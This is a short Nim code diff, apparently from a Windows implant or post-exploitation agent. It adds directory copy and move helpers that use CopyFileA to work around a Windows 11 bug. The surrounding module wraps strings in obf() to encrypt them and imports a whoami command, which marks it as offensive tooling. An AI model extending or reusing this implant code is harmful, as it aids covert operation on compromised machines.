@@ -1,6 +1,6 @@
 from nativesockets import getHostName, gethostbyname
-from os import getCurrentProcessId, splitPath, getAppFilename
-import winlean
+from os import getCurrentProcessId, splitPath, getAppFilename, createDir, walkDir, splitPath, pcDir, `/`, removeDir
+from winim/lean import CopyFileA, FALSE, ULONG, winstrConverterStringToPtrChar
 import ../commands/whoami
 import strenc
 
@@ -36,6 +36,24 @@ proc getWindowsVersion*() : string =
     discard rtlGetVersion(versionInfo)
     var vInfo = obf("Windows ") & $versionInfo.dwMajorVersion & obf(" build ") & $versionInfo.dwBuildNumber
     result = vInfo
+
+# Define copyDir and moveDir functions to override os stdlib
+# This fixes a bug where any function with using copyFile does not work with Win11 DLLs
+# See: https://github.com/nim-lang/Nim/issues/21504
+proc copyDir*(source, dest: string) =
+    createDir(dest)
+    for kind, path in walkDir(source):
+        var 
+            noSource = splitPath(path).tail
+            dPath = dest / noSource
+        if kind == pcDir:
+            copyDir(path, dPath)
+        else:
+            CopyFileA(path, dPath, FALSE)
+
+proc moveDir*(source, dest: string) =
+    copydir(source, dest)
+    removeDir(source)
 
 # Get the username
 proc getUsername*() : string = 
